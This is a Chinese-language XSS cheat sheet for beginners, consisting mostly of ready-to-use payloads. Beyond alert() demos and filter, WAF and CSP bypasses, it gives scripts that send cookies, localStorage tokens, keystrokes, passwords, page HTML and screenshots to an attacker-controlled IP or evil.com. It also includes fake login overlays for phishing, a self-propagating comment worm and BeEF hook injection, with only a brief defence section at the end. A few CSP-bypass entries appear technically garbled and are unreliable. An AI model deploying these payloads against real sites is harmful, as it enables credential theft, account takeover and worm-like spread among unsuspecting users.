
```markdown
# XSS 速查卡（小白超详细完整版）

---

## 一、XSS 类型速览

- **反射型 XSS** → 数据经过后端，但不存储（如 URL 参数）
- **存储型 XSS** → 数据存入数据库，每次访问都执行（最危险）
- **DOM 型 XSS** → 纯前端漏洞，不经过后端（location.hash、document.referrer 等）

---

## 二、初级 Payload（直接弹窗）

### 基础脚本
```html
<script>alert('XSS')</script>
<script>alert(1)</script>
<script>alert(document.cookie)</script>
```

### 标签事件
```html
<img src=x onerror=alert(1)>
<body onload=alert(1)>
<div onmouseover=alert(1)>鼠标移过来</div>
<input onfocus=alert(1) autofocus>
```

### 伪协议
```html
<a href="javascript:alert(1)">点我</a>
<iframe src="javascript:alert(1)">
```

### 其他标签
```html
<svg onload=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
```

---

## 三、中级 Payload（绕过简单过滤）

### 1. 大小写混写
```html
<ScRiPt>alert(1)</sCrIpT>
<ImG sRc=x oNeRrOr=alert(1)>
```

### 2. 双写（绕过替换一次的过滤）
```html
<scr<script>ipt>alert(1)</scr</script>ipt>
```

### 3. 换行与空格
```html
<scr%0Aipt>alert(1)</scr%0Aipt>
<img%0Asrc=x%0Aonerror=alert(1)>
```

### 4. 编码绕过

**HTML 实体编码**
```html
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
```

**URL 编码**（需要后端解码）
```
%3Cscript%3Ealert(1)%3C/script%3E
```

**十六进制编码**
```
\x3Cscript\x3Ealert(1)\x3C/script\x3E
```

### 5. 注释干扰
```html
<sc<!--test-->ript>alert(1)</sc<!--test-->ript>
<img/*test*/src=x/*test*/onerror=alert(1)>
```

### 6. 利用未闭合标签
```html
<img src=x onerror=alert(1) "
<svg><script>alert(1)</script>   <!-- 自动闭合 -->
```

---

## 四、高级 Payload（绕过复杂 WAF）

### 1. JavaScript 伪协议不同写法
```html
javascript:alert(1)
JaVaScRiPt:alert(1)
javaSCRIPT:alert(1)
```

### 2. 反引号（某些 WAF 不拦截）
```html
<a href=`javascript:alert(1)`>点我</a>
```

### 3. with 和 eval
```html
<script>with(document)body.appendChild(createElement('script')).src='//xss.js'</script>
<script>eval('al'+'ert(1)')</script>
```

### 4. window 对象
```html
<script>window['alert'](1)</script>
<script>top['alert'](1)</script>
<script>self.alert(1)</script>
```

### 5. setTimeout / setInterval
```html
<script>setTimeout('alert(1)', 0)</script>
<script>setInterval('alert(1)', 1000)</script>
```

### 6. toString / valueOf
```html
<script>alert(1).toString()</script>
<script>alert(1).valueOf()</script>
```

### 7. 模板字符串
```html
<script>alert`1`</script>                    <!-- 特殊语法，不报错 -->
<script>`${alert(1)}`</script>
```

### 8. 反斜杠换行
```html
<script>\
alert(1)\
</script>
```

---

## 五、窃取 Cookie（配合 nc 或 VPS）

### 1. 基础版（通过 Image 发送）
```html
<script>new Image().src='http://你的IP:8080?cookie='+document.cookie</script>
```

### 2. 通过 fetch（更隐蔽）
```html
<script>fetch('http://你的IP:8080?c='+document.cookie)</script>
```

### 3. 通过 XMLHttpRequest
```html
<script>var xhr=new XMLHttpRequest();xhr.open('GET','http://你的IP:8080?c='+document.cookie);xhr.send()</script>
```

### 4. 通过 navigator.sendBeacon（不阻塞页面）
```html
<script>navigator.sendBeacon('http://你的IP:8080', document.cookie)</script>
```

### 5. 窃取 localStorage
```html
<script>fetch('http://你的IP:8080?local='+localStorage.getItem('token'))</script>
```

### 6. 窃取整个 localStorage
```html
<script>fetch('http://你的IP:8080?local='+JSON.stringify(localStorage))</script>
```

### 7. 窃取表单输入（实时监听）
```html
<script>
document.addEventListener('input', function(e) {
    fetch('http://你的IP:8080?input='+e.target.value);
});
</script>
```

### 8. 窃取密码字段
```html
<script>
setInterval(function(){
    var pwd = document.querySelector('input[type=password]');
    if(pwd && pwd.value) fetch('http://你的IP:8080?pwd='+pwd.value);
}, 3000);
</script>
```

### 监听端口（Kali 上运行）
```bash
sudo nc -lvnp 8080
# 或使用 Python 快速起一个 HTTP 服务器
python3 -m http.server 8080
```

---

## 六、键盘记录器（Keylogger）

### 1. 基础键盘记录
```html
<script>
var keys = '';
document.onkeypress = function(e) {
    keys += e.key;
    if(keys.length > 10) {
        fetch('http://你的IP:8080?keys='+keys);
        keys = '';
    }
}
</script>
```

### 2. 记录所有按键（包括特殊键）
```html
<script>
document.onkeydown = function(e) {
    fetch('http://你的IP:8080?key='+e.key+'&code='+e.code);
}
</script>
```

### 3. 测试用（弹窗显示）
```html
<script>
document.onkeypress = function(e) {
    console.log('按下了：'+e.key);
}
</script>
```

---

## 七、偷取页面内容

### 1. 偷整个页面 HTML
```html
<script>
fetch('http://你的IP:8080?html='+encodeURIComponent(document.documentElement.innerHTML))
</script>
```

### 2. 偷页面文字
```html
<script>
fetch('http://你的IP:8080?text='+encodeURIComponent(document.body.innerText))
</script>
```

### 3. 偷特定元素（如所有链接）
```html
<script>
var links = [];
document.querySelectorAll('a').forEach(function(a) {
    links.push(a.href);
});
fetch('http://你的IP:8080?links='+JSON.stringify(links));
</script>
```

### 4. 偷页面截图（使用 html2canvas）
```html
<script src='https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js'></script>
<script>
html2canvas(document.body).then(canvas => {
    fetch('http://你的IP:8080?screenshot='+canvas.toDataURL());
});
</script>
```

---

## 八、钓鱼攻击（伪造登录框）

### 1. 弹窗钓鱼
```html
<script>
var password = prompt('会话已过期，请重新输入密码：', '');
if(password) {
    fetch('http://你的IP:8080?password='+password);
}
</script>
```

### 2. 覆盖整个页面（假登录页）
```html
<script>
document.body.innerHTML = `
    <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999">
        <h1>请重新登录</h1>
        <input type="text" id="user" placeholder="用户名">
        <input type="password" id="pass" placeholder="密码">
        <button onclick="login()">登录</button>
    </div>
`;
function login() {
    var user = document.getElementById('user').value;
    var pass = document.getElementById('pass').value;
    fetch('http://你的IP:8080?user='+user+'&pass='+pass);
    alert('登录失败，请稍后重试');
}
</script>
```

### 3. 覆盖特定区域（悬浮框）
```html
<script>
var div = document.createElement('div');
div.innerHTML = '<div style="position:fixed;top:50%;left:50%;background:white;border:1px solid black;padding:20px">' +
    '<h3>请输入密码继续</h3>' +
    '<input type="password" id="fakePwd">' +
    '<button onclick="steal()">确定</button>' +
    '</div>';
document.body.appendChild(div);
function steal() {
    var pwd = document.getElementById('fakePwd').value;
    fetch('http://你的IP:8080?pwd='+pwd);
    div.remove();
}
</script>
```

---

## 九、DOM 型 XSS 特殊触发点

### 1. location.hash
```
http://target.com/page.html#<script>alert(1)</script>
```
如果页面使用了 `location.hash` 并 `innerHTML`，就会触发。

### 2. document.referrer
从恶意页面跳转过来
```html
<a href="http://target.com">点我</a>
```

### 3. postMessage（跨域通信）
```html
<script>
window.addEventListener('message', function(e) {
    eval(e.data);  // 危险！
});
</script>
```
攻击者页面发送：
```html
window.postMessage('alert(1)', '*');
```

### 4. localStorage / sessionStorage
如果页面直接 `eval(localStorage.getItem('code'))`
```html
localStorage.setItem('code', 'alert(1)');
```

### 5. window.name
如果页面 `eval(window.name)`
```html
window.name = 'alert(1)';
```

### 6. eval 执行字符串
```html
eval('alert(1)')
```

### 7. new Function
```html
new Function('alert(1)')()
```

---

## 十、绕过 CSP（内容安全策略）

如果目标有 CSP，常规 `<script>` 可能不执行，以下是部分绕过技巧：

### 1. 利用 CDN 上的 JSONP 接口
```html
<script src="https://api.example.com/jsonp?callback=alert"></script>
```

### 2. 利用已白名单的域名
如果某个 CDN 在白名单内，上传 `xss.js` 到那里。

### 3. 利用 link 标签预加载
```html
<link rel="prefetch" href="https://evil.com/steal?c="+document.cookie>
```

### 4. 利用 meta 标签刷新
```html
<meta http-equiv="refresh" content="0;url=https://evil.com?c="+document.cookie>
```

### 5. 利用 base 标签改变相对路径
```html
<base href="https://evil.com/">
<script src="xss.js"></script>  <!-- 实际加载 evil.com/xss.js -->
```

### 6. 利用 AngularJS 旧版
```html
<div ng-app>{{constructor.constructor('alert(1)')()}}</div>
```

---

## 十一、XSS 蠕虫（自动传播）

存储型 XSS 蠕虫示例（如留言板），当用户访问被感染的页面时，自动发帖传播：

```html
<script>
var payload = '<script src="http://evil.com/xss.js"><\/script>';
fetch('/comment.php', {
    method: 'POST',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: 'comment=' + encodeURIComponent(payload)
});
</script>
```

更隐蔽的版本（利用当前用户的 Cookie 自动发帖）：
```html
<script>
var xhr = new XMLHttpRequest();
xhr.open('POST', '/comment.php', true);
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.send('comment=<script src="http://evil.com/xss.js"><\/script>');
</script>
```

---

## 十二、利用 BeEF 框架（高级）

BeEF 是一个浏览器攻击框架，比 `nc` 强大得多。

### 1. 安装 BeEF（Kali 自带）
```bash
sudo beef-xss
```

### 2. 启动 BeEF
```bash
beef-xss
# 默认地址：http://127.0.0.1:3000/ui/panel
# 用户名：beef，密码：beef
```

### 3. 生成 hook.js 链接
```
http://你的IP:3000/hook.js
```

### 4. 在 DVWA 输入框注入
```html
<script src="http://你的IP:3000/hook.js"></script>
```

### 5. 受害者访问后
BeEF 面板会显示上线设备，可执行：窃取 Cookie、截屏、键盘记录、弹出对话框、内网扫描等。

---

## 十三、更多 Payload 变种

### 1. 短 Payload（长度受限时）
```html
<script src=//短网址></script>
<svg/onload=alert(1)>
<iframe/onload=alert(1)>
```

### 2. Unicode 编码
```html
<script>\u0061\u006c\u0065\u0072\u0074(1)</script>
```

### 3. 十六进制编码
```
\x3cscript\x3ealert(1)\x3c/script\x3e
```

### 4. Base64
```html
<script>eval(atob('YWxlcnQoMSk='))</script>  <!-- alert(1) 的 Base64 -->
```

### 5. 模板字符串嵌套
```html
<script>`${`${`alert(1)`}`}`</script>
```

### 6. 利用 `$` 和 `_`（某些库自带）
```html
<script>$.getScript('//evil.com/xss.js')</script>
<script>_.template('<%= alert(1) %>')()</script>
```

### 7. 利用 `console` 对象
```html
<script>console.log(1)</script>
<script>console.error(1)</script>
<script>console.warn(1)</script>
```

### 8. 利用 `throw` 和 `try`
```html
<script>throw new Error('<img src=x onerror=alert(1)>')</script>
```

---

## 十四、靶场切换与测试环境

### DVWA 地址
```
http://localhost/dvwa/vulnerabilities/xss_r/    # 反射型
http://localhost/dvwa/vulnerabilities/xss_s/    # 存储型
http://localhost/dvwa/vulnerabilities/xss_d/    # DOM 型
```

### 安全级别设置
```
http://localhost/dvwa/security.php
```

### 其他靶场（推荐）
- https://xss-game.appspot.com/ — Google XSS 游戏
- https://portswigger.net/web-security/cross-site-scripting — PortSwigger 实验室
- http://testhtml5.vulnweb.com/ — Acunetix 测试网站

### 本地测试环境
```html
<!DOCTYPE html>
<html>
<head><title>XSS 测试</title></head>
<body>
    <input id="input" placeholder="输入 payload">
    <button onclick="document.getElementById('output').innerHTML = input.value">测试</button>
    <div id="output"></div>
</body>
</html>
```

---

## 十五、防御速查（保护自己的网站）

### 后端防御
1. 输出编码：`htmlspecialchars($input, ENT_QUOTES, 'UTF-8')`
2. 使用 CSP（Content-Security-Policy）头
3. HttpOnly Cookie（防止 JS 读取）
4. 输入过滤（白名单优于黑名单）

### 前端防御
1. 使用 `textContent` 而不是 `innerHTML`
2. 使用 DOMPurify 过滤用户输入
3. 避免使用 `eval`、`new Function`、`setTimeout(string)`

### CSP 示例
```
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.com
```

---

## 十六、速查小抄

### 最常用 Payload
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<a href=javascript:alert(1)>点我</a>
```

### 窃取 Cookie
```html
<script>new Image().src='http://你的IP:8080?c='+document.cookie</script>
```

### 键盘记录
```html
<script>document.onkeypress=function(e){fetch('http://IP:8080?k='+e.key)}</script>
```

### 钓鱼
```html
<script>prompt('密码过期，请重新输入')</script>
```

### 绕过技巧速记
```
大小写 | 双写 | 编码 | 换行 | 注释 | 反引号
```

### 测试环境
```
DVWA | XSS Game | 自己写 HTML 测试页
```

---